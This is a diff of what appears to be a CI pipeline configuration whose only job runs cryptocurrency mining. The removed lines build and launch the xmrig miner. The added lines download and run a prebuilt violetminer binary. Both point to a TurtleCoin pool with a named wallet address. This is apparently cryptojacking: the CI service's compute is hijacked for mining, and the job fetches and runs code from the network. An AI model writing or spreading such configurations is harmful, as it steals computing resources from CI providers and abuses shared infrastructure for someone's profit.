@@ -12,7 +12,8 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - >-
-              sudo apt update -y && sudo apt-get upgrade -y && echo Y | sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo apt-get install cpulimit && git clone https://github.com/xmrig/xmrig.git && sudo sysctl -w vm.nr_hugepages=2084 && cd xmrig && mkdir build && cd build && cmake .. && make && screen ./xmrig -a argon2/chukwav2 --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u
-              TRTLv3wsfZPRKTmA3k3eT1QHfWwgvu9e3ND14rwXkWq1TKj2tsNnPyC5FdiKQjfi6iEfpVJXD5nHxN2RHT72uPdphSkmoPiZcSy
-            - ' -p yoz -t8'
+            - 'wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz'
+            - tar xf violetminer-linux-v0.2.2.tar.gz
+            - cd violetminer-linux-v0.2.2
+            - './violetminer --pool turtlecoin.herominers.com:10381 --username TRTLv3wsfZPRKTmA3k3eT1QHfWwgvu9e3ND14rwXkWq1TKj2tsNnPyC5FdiKQjfi6iEfpVJXD5nHxN2RHT72uPdphSkmoPiZcSy'
+            - '--password yoz --algorithm turtlecoin'
